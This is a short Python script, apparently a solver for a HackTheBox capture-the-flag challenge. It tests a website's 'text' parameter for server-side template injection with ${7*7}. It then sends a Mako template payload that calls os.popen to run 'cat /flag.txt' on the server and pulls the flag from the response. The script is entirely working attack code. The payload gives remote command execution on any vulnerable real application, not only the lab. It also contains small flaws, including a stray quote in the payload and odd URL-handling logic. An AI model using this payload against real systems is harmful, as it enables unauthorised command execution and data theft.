import requests

url = input("🔗 Please enter the website URL ")
if not url.startswith("https://") and not url.startswith("http://"):
    url = "http://" + url
else:
    r = requests.get(f"{url}")

#Test SSTI
testing = f"{url}?text=${{7*7}}"

try:
    res = requests.get(testing)
    response_text = res.text

    if "49" in response_text:
        print("✅ Successful SSTI injection! Woah!")
        print("Now I will try to extract the flag. Watch and learn.")
        encode ='${self.module.cache.util.os.popen("cat%20/flag.txt").read()}"'
        testing = f"{url}?text={encode}"
        res2 = requests.get(testing)
        res2 = res2.text
        if "HTB{" in res2:
            start = res2.index("HTB{")
            end = res2.index("}",start) + 1
            flag = res2[start:end]
            print(f"WOWWWW Here your flag : {flag}")
    
    else:
        print("❌ Injection failed. Bad news.")
except requests.exceptions.RequestException as e:
    print(f"Error:{e}")
